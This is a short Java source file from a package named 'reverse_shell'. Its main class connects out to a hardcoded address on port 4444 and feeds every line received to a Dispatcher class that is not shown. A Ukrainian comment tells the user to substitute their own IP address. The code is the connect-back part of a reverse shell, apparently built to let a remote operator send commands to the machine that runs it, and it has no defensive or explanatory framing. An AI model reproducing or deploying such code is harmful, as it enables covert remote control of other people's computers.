package reverse_shell;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.Socket;

public class Main {
    public static void main(String[] args) {
        String host = "192.168.1.184"; // Заміни на свою IP-адресу
        int port = 4444;

        try {
            Socket socket = new Socket(host, port);
            BufferedReader reader = new BufferedReader(new InputStreamReader(socket.getInputStream()));
            Dispatcher dispatcher = new Dispatcher();

            String input;
            while ((input = reader.readLine()) != null) {
                dispatcher.dispatch(input, socket);
            }

            socket.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
